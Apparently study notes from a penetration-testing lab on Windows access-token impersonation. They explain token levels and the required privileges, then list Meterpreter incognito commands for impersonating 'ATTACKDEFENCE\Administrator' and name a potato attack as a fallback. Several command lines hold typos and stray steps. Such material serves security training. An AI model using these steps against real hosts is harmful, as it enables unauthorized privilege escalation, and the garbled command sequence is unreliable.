
## Access Token Inpersonation

> *   Windows Access Tokens are a core element of the authentication process on Windows and are created and managed by the Local Security Subsystem Service (LSASS).
> *   An Access Token is generated by the winlogon.exe process every time a user authenticates.
> *   It includes the identity and privileges of the user account associated with the thread process.
> *   The Token is attached to the userinit.exe, after which all child processes started by a user will inherit a copy of the access token.
> *   An access token will typically be assigned one of the following security levels:
>     *   Impersonate-level tokens are created as a direct result of non-interactive login on Windows, typically through specific system services or domain logons. They can be used to impersonate a token on the local system and not on any external systems that utilize the token.
>     *   Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocols such as RDP. They can be used to impersonate tokens on any system.

> *   The process of impersonating access tokens will depend on the privileges assigned to the account that has been exploited to gain initial access.
> *   One of the following privileges are required for a successful impersonation attack:
>     *   SeAssignPrimaryToken: This allows a user to impersonate tokans.
>     *   SeCreateToken: This allows a user to create an arbitrary token with administrative privileges.
>     *   SeImpersonatePrivileges: This allows a user to create a process under the security context of another user typically with administrative privileges.

## Meterpreter with Incognito Module

> *   Incognito is a built-in meterpreter module that allows you to impersonate user tokens ater successful exploitation.
> *   We can use the incognito module to display a list of available tokens that we can impersonate.

Â After gaining initial access, migrate meterpreter session to a new process like explorer.

```plaintext
meterpreter>
sysinfo
pgrep explorer
migrate <explorer id>
```

if it doesn't work, check for the privileges we have.

```plaintext
meterpreter>
getuid
getprivs
load incognito
exploit
load incognito
list_tokens -u
impersonate_token "ATTACKDEFENCE\Administrator"
geuid
pgrep explorer <explorer id>
migrate <explorer id>
getprivs
getuid
```

### \*\*\*If we don't have any privilege access toke available, we will need to use the potatto attack to generate a NT Authority System Access Token that we can use to impersonate.
